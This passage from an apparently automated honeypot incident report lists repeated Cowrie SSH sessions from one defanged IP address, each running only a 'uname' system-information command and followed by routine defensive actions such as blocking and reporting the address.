|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:43` | `cowrie.session.connect` |
| `2026-09-27 13:02:43` | `cowrie.client.version` |
| `2026-09-27 13:02:43` | `cowrie.client.kex` |
| `2026-09-27 13:02:43` | `cowrie.login.success` |
| `2026-09-27 13:02:44` | `cowrie.session.params` |
| `2026-09-27 13:02:44` | `cowrie.command.input` |
| `2026-09-27 13:02:44` | `cowrie.log.closed` |
| `2026-09-27 13:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6baa74de4a74

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:48` | `cowrie.session.connect` |
| `2026-09-27 13:02:48` | `cowrie.client.version` |
| `2026-09-27 13:02:48` | `cowrie.client.kex` |
| `2026-09-27 13:02:48` | `cowrie.login.success` |
| `2026-09-27 13:02:49` | `cowrie.session.params` |
| `2026-09-27 13:02:49` | `cowrie.command.input` |
| `2026-09-27 13:02:49` | `cowrie.log.closed` |
| `2026-09-27 13:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ac15a8d0fec

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:53` | `cowrie.session.connect` |
| `2026-09-27 13:02:53` | `cowrie.client.version` |
| `2026-09-27 13:02:53` | `cowrie.client.kex` |
| `2026-09-27 13:02:54` | `cowrie.login.success` |
| `2026-09-27 13:02:54` | `cowrie.session.params` |
| `2026-09-27 13:02:54` | `cowrie.command.input` |
| `2026-09-27 13:02:54` | `cowrie.log.closed` |
| `2026-09-27 13:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a58459a2490

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:58` | `cowrie.session.connect` |
| `2026-09-27 13:02:58` | `cowrie.client.version` |
| `2026-09-27 13:02:58` | `cowrie.client.kex` |
| `2026-09-27 13:02:58` | `cowrie.login.success` |
| `2026-09-27 13:02:59` | `cowrie.session.params` |
| `2026-09-27 13:02:59` | `cowrie.command.input` |
| `2026-09-27 13:02:59` | `cowrie.log.closed` |
| `2026-09-27 13:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5f040356c82

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:03` | `cowrie.session.connect` |
| `2026-09-27 13:03:03` | `cowrie.client.version` |
| `2026-09-27 13:03:03` | `cowrie.client.kex` |
| `2026-09-27 13:03:04` | `cowrie.login.success` |
| `2026-09-27 13:03:04` | `cowrie.session.params` |
| `2026-09-27 13:03:04` | `cowrie.command.input` |
| `2026-09-27 13:03:04` | `cowrie.log.closed` |
| `2026-09-27 13:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b04ddba7b894

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:08` | `cowrie.session.connect` |
| `2026-09-27 13:03:08` | `cowrie.client.version` |
| `2026-09-27 13:03:08` | `cowrie.client.kex` |
| `2026-09-27 13:03:09` | `cowrie.login.success` |
| `2026-09-27 13:03:09` | `cowrie.session.params` |
| `2026-09-27 13:03:09` | `cowrie.command.input` |
| `2026-09-27 13:03:10` | `cowrie.log.closed` |
| `2026-09-27 13:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0344be6f6166

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:13` | `cowrie.session.connect` |
| `2026-09-27 13:03:13` | `cowrie.client.version` |
| `2026-09-27 13:03:13` | `cowrie.client.kex` |
| `2026-09-27 13:03:14` | `cowrie.login.success` |
| `2026-09-27 13:03:14` | `cowrie.session.params` |
| `2026-09-27 13:03:14` | `cowrie.command.input` |
| `2026-09-27 13:03:14` | `cowrie.log.closed` |
| `2026-09-27 13:03:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f21c10e39c19

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:18` | `cowrie.session.connect` |
| `2026-09-27 13:03:18` | `cowrie.client.version` |
| `2026-09-27 13:03:18` | `cowrie.client.kex` |
| `2026-09-27 13:03:18` | `cowrie.login.success` |
| `2026-09-27 13:03:19` | `cowrie.session.params` |
| `2026-09-27 13:03:19` | `cowrie.command.input` |
| `2026-09-27 13:03:19` | `cowrie.log.closed` |
| `2026-09-27 13:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77d160db7cad

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:23` | `cowrie.session.connect` |
| `2026-09-27 13:03:23` | `cowrie.client.version` |
| `2026-09-27 13:03:23` | `cowrie.client.kex` |
| `2026-09-27 13:03:23` | `cowrie.login.success` |
| `2026-09-27 13:03:24` | `cowrie.session.params` |
| `2026-09-27 13:03:24` | `cowrie.command.input` |
| `2026-09-27 13:03:24` | `cowrie.log.closed` |
| `2026-09-27 13:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36388f636e09

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:27` | `cowrie.session.connect` |
| `2026-09-27 13:03:27` | `cowrie.client.version` |
| `2026-09-27 13:03:27` | `cowrie.client.kex` |
| `2026-09-27 13:03:28` | `cowrie.login.success` |
| `2026-09-27 13:03:29` | `cowrie.session.params` |
| `2026-09-27 13:03:29` | `cowrie.command.input` |
| `2026-09-27 13:03:29` | `cowrie.log.closed` |
| `2026-09-27 13:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03227a08646f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:32` | `cowrie.session.connect` |
| `2026-09-27 13:03:32` | `cowrie.client.version` |
| `2026-09-27 13:03:32` | `cowrie.client.kex` |
| `2026-09-27 13:03:33` | `cowrie.login.success` |
| `2026-09-27 13:03:34` | `cowrie.session.params` |
| `2026-09-27 13:03:34` | `cowrie.command.input` |
| `2026-09-27 13:03:34` | `cowrie.log.closed` |
| `2026-09-27 13:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a56e07a0893

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:37` | `cowrie.session.connect` |
| `2026-09-27 13:03:37` | `cowrie.client.version` |
| `2026-09-27 13:03:37` | `cowrie.client.kex` |
| `2026-09-27 13:03:38` | `cowrie.login.success` |
| `2026-09-27 13:03:39` | `cowrie.session.params` |
| `2026-09-27 13:03:39` | `cowrie.command.input` |
| `2026-09-27 13:03:39` | `cowrie.log.closed` |
| `2026-09-27 13:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-773339ef6f79

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:42` | `cowrie.session.connect` |
| `2026-09-27 13:03:42` | `cowrie.client.version` |
| `2026-09-27 13:03:42` | `cowrie.client.kex` |
| `2026-09-27 13:03:42` | `cowrie.login.success` |
| `2026-09-27 13:03:43` | `cowrie.session.params` |
| `2026-09-27 13:03:43` | `cowrie.command.input` |
| `2026-09-27 13:03:43` | `cowrie.log.closed` |
| `2026-09-27 13:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ad4efc7dbe8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:47` | `cowrie.session.connect` |
| `2026-09-27 13:03:47` | `cowrie.client.version` |
| `2026-09-27 13:03:47` | `cowrie.client.kex` |
| `2026-09-27 13:03:47` | `cowrie.login.success` |
| `2026-09-27 13:03:48` | `cowrie.session.params` |
| `2026-09-27 13:03:48` | `cowrie.command.input` |
| `2026-09-27 13:03:48` | `cowrie.log.closed` |
| `2026-09-27 13:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d241198799b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:52` | `cowrie.session.connect` |
| `2026-09-27 13:03:52` | `cowrie.client.version` |
| `2026-09-27 13:03:52` | `cowrie.client.kex` |
| `2026-09-27 13:03:52` | `cowrie.login.success` |
| `2026-09-27 13:03:53` | `cowrie.session.params` |
| `2026-09-27 13:03:53` | `cowrie.command.input` |
| `2026-09-27 13:03:53` | `cowrie.log.closed` |
| `2026-09-27 13:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6af631480daf

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:03 |
| **Last Seen** | 2026-09-27 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:03:57` | `cowrie.session.connect` |
| `2026-09-27 13:03:57` | `cowrie.client.version` |
| `2026-09-27 13:03:57` | `cowrie.client.kex` |
| `2026-09-27 13:03:57` | `cowrie.login.success` |
| `2026-09-27 13:03:58` | `cowrie.session.params` |
| `2026-09-27 13:03:58` | `cowrie.command.input` |
| `2026-09-27 13:03:59` | `cowrie.log.closed` |
| `2026-09-27 13:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e1c0a0b357e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:02` | `cowrie.session.connect` |
| `2026-09-27 13:04:02` | `cowrie.client.version` |
| `2026-09-27 13:04:02` | `cowrie.client.kex` |
| `2026-09-27 13:04:02` | `cowrie.login.success` |
| `2026-09-27 13:04:03` | `cowrie.session.params` |
| `2026-09-27 13:04:03` | `cowrie.command.input` |
| `2026-09-27 13:04:03` | `cowrie.log.closed` |
| `2026-09-27 13:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cefb445063b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:07` | `cowrie.session.connect` |
| `2026-09-27 13:04:07` | `cowrie.client.version` |
| `2026-09-27 13:04:07` | `cowrie.client.kex` |
| `2026-09-27 13:04:07` | `cowrie.login.success` |
| `2026-09-27 13:04:09` | `cowrie.session.params` |
| `2026-09-27 13:04:09` | `cowrie.command.input` |
| `2026-09-27 13:04:09` | `cowrie.log.closed` |
| `2026-09-27 13:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39058c31bb23

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:12` | `cowrie.session.connect` |
| `2026-09-27 13:04:12` | `cowrie.client.version` |
| `2026-09-27 13:04:12` | `cowrie.client.kex` |
| `2026-09-27 13:04:12` | `cowrie.login.success` |
| `2026-09-27 13:04:13` | `cowrie.session.params` |
| `2026-09-27 13:04:13` | `cowrie.command.input` |
| `2026-09-27 13:04:13` | `cowrie.log.closed` |
| `2026-09-27 13:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-407a24ed899e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:17` | `cowrie.session.connect` |
| `2026-09-27 13:04:17` | `cowrie.client.version` |
| `2026-09-27 13:04:17` | `cowrie.client.kex` |
| `2026-09-27 13:04:17` | `cowrie.login.success` |
| `2026-09-27 13:04:18` | `cowrie.session.params` |
| `2026-09-27 13:04:18` | `cowrie.command.input` |
| `2026-09-27 13:04:18` | `cowrie.log.closed` |
| `2026-09-27 13:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6837be1f824

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:22` | `cowrie.session.connect` |
| `2026-09-27 13:04:22` | `cowrie.client.version` |
| `2026-09-27 13:04:22` | `cowrie.client.kex` |
| `2026-09-27 13:04:22` | `cowrie.login.success` |
| `2026-09-27 13:04:23` | `cowrie.session.params` |
| `2026-09-27 13:04:23` | `cowrie.command.input` |
| `2026-09-27 13:04:23` | `cowrie.log.closed` |
| `2026-09-27 13:04:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53a7eed2d72

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:27` | `cowrie.session.connect` |
| `2026-09-27 13:04:27` | `cowrie.client.version` |
| `2026-09-27 13:04:27` | `cowrie.client.kex` |
| `2026-09-27 13:04:28` | `cowrie.login.success` |
| `2026-09-27 13:04:29` | `cowrie.session.params` |
| `2026-09-27 13:04:29` | `cowrie.command.input` |
| `2026-09-27 13:04:29` | `cowrie.log.closed` |
| `2026-09-27 13:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea452dfe7c19

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:32` | `cowrie.session.connect` |
| `2026-09-27 13:04:32` | `cowrie.client.version` |
| `2026-09-27 13:04:32` | `cowrie.client.kex` |
| `2026-09-27 13:04:33` | `cowrie.login.success` |
| `2026-09-27 13:04:34` | `cowrie.session.params` |
| `2026-09-27 13:04:34` | `cowrie.command.input` |
| `2026-09-27 13:04:34` | `cowrie.log.closed` |
| `2026-09-27 13:04:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00a6adf8013e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:37` | `cowrie.session.connect` |
| `2026-09-27 13:04:37` | `cowrie.client.version` |
| `2026-09-27 13:04:37` | `cowrie.client.kex` |
| `2026-09-27 13:04:38` | `cowrie.login.success` |
| `2026-09-27 13:04:38` | `cowrie.session.params` |
| `2026-09-27 13:04:38` | `cowrie.command.input` |
| `2026-09-27 13:04:39` | `cowrie.log.closed` |
| `2026-09-27 13:04:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04488b391693

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:42` | `cowrie.session.connect` |
| `2026-09-27 13:04:42` | `cowrie.client.version` |
| `2026-09-27 13:04:42` | `cowrie.client.kex` |
| `2026-09-27 13:04:43` | `cowrie.login.success` |
| `2026-09-27 13:04:43` | `cowrie.session.params` |
| `2026-09-27 13:04:43` | `cowrie.command.input` |
| `2026-09-27 13:04:44` | `cowrie.log.closed` |
| `2026-09-27 13:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b845eb5c5e6

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:47` | `cowrie.session.connect` |
| `2026-09-27 13:04:47` | `cowrie.client.version` |
| `2026-09-27 13:04:47` | `cowrie.client.kex` |
| `2026-09-27 13:04:48` | `cowrie.login.success` |
| `2026-09-27 13:04:48` | `cowrie.session.params` |
| `2026-09-27 13:04:48` | `cowrie.command.input` |
| `2026-09-27 13:04:49` | `cowrie.log.closed` |
